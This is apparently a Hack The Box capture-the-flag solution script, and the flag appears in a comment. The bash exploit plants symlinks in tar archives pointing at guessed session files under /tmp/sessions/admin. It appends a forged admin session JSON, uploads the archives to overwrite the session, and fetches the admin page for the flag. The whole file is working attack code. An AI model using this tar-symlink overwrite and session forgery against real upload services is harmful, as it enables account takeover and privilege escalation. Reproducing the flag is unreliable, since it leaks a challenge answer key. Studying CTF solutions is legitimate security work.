#!/bin/bash
# Flag: HTB{S0m3tIm3s_Its_J4usT_A_B!G_M3ss}
target_ip="127.0.0.1"; target_port="1337"
echo "Registering admin user..."
curl -s "http://$target_ip:$target_port/register" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'username=admin&password=admin'

echo "Logging in..."
curl -s "http://$target_ip:$target_port/login" \
  -c cookies.txt \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'username=admin&password=admin'

now=$(date +%s)
for i in {1..30}; do
  timestamp=$((now + i))
  hash=$(echo -n "$timestamp" | sha256sum | awk '{print $1}')
  echo "Uploading session $hash..."
  ln -s "/tmp/sessions/admin/$hash" "file$i"
  tar -cvf "archive$i.tar" "file$i" >/dev/null
  rm "file$i"
  echo -n '{"username":"admin","id":1,"role":"admin"}' > "file$i"
  tar -rvf "archive$i.tar" "file$i" >/dev/null
  rm "file$i"
  file_size=$(stat -c%s "archive$i.tar")
  curl -s -b cookies.txt -F "archive=@./archive$i.tar" "http://$target_ip:$target_port/user/upload" >/dev/null
done

echo "Logging in to prepare session..."
curl -s "http://$target_ip:$target_port/login" \
  -c cookies.txt \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'username=admin&password=x' > /dev/null

echo "Fetching flag..."
curl -s -b "username=admin; session=x" "http://$target_ip:$target_port/user/admin" | grep HTB